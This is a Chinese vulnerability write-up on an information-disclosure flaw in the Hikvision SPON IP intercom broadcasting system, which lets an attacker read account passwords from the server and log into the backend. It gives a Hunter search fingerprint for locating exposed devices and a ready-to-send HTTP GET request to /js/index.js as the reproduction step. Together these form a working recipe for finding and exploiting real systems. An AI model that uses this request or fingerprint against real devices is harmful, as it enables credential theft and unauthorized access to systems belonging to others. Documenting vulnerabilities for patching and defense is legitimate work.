# 海康威视SPON IP网络对讲广播系统index存在信息泄露漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">Hikvision Intercom Broadcasting System是中国海康威视（Hikvision）公司的一个对讲广播系统。海康威视SPON IP网络对讲广播系统index存在信息泄露漏洞，攻击者可通过该漏洞在服务器端读取账户密码，从而登录后台。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ 海康威视SPON IP网络对讲广播系统

# 三、资产测绘
+ Hunter：`web.body="vendors/custom/html5.min.js"`
+ 特征

![1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b.png](./img/ZQoNFDtBj3VElRjU/1704857140903-8dadddb1-8d90-42a6-9179-3cd4dca00c8b-912720.png)

# 四、漏洞复现
```java
GET /js/index.js?t=0.1 HTTP/1.1
Host: 
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Accept-Encoding: gzip, deflate, br
Connection: close
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0
```

![1704944865462-8df9d69d-9782-4600-a55a-b0e4d4aac452.png](./img/ZQoNFDtBj3VElRjU/1704944865462-8df9d69d-9782-4600-a55a-b0e4d4aac452-356579.png)



> 更新: 2024-02-29 23:57:17  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ladsou0vl281yvr7>